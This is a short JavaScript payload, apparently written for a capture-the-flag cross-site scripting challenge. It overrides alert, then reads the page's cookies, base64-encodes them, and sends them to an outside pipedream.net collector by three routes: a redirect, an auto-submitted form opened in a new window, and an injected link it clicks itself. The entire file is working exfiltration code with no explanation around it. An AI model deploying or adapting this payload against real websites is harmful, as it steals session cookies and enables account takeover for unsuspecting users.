window.alert = function () {console.log("alert(1337)")};
setTimeout (() =>{
    var link = document.createElement("a");
    var link_final = "https://eoctl0knzoys9l9.m.pipedream.net/?flag=" + btoa(document.cookie)
    document.location = link_final
    link.setAttribute("href", link_final);
    link.setAttribute("id", "link");
    var form = document.createElement("form");
    form.setAttribute("action", link_final);
    form.setAttribute("method", "get");
    form.setAttribute("class", "form_");
    form.setAttribute("target", "send_flag");
    link.innerHTML = "hi"
    document.body.appendChild(form);
    document.body.appendChild(link)
    w = window.open("", "send_flag")
    document.querySelector('.form_').submit();
    document.querySelector("#link").click()
}, 500)
